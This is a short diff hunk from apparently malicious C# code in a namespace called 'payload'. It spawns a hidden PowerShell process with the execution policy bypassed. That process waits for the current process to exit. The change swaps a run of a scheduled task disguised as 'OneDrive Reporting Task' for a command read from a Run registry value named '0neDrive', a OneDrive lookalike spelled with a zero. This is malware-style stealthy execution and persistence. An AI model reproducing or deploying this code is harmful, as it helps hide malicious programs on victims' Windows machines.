@@ -35,7 +35,7 @@ namespace payload
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "powershell.exe",
-                Arguments = $"-noprofile -executionpolicy bypass -command \"[System.Diagnostics.Process]::GetProcessById({Process.GetCurrentProcess().Id}).WaitForExit(); schtasks /run /i /tn 'OneDrive Reporting Task'\"",
+                Arguments = $"-noprofile -executionpolicy bypass -command \"[System.Diagnostics.Process]::GetProcessById({Process.GetCurrentProcess().Id}).WaitForExit(); cmd /c (Get-ItemPropertyValue -path 'Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -name 0neDrive)\"",
                 WindowStyle = ProcessWindowStyle.Hidden
             });
 
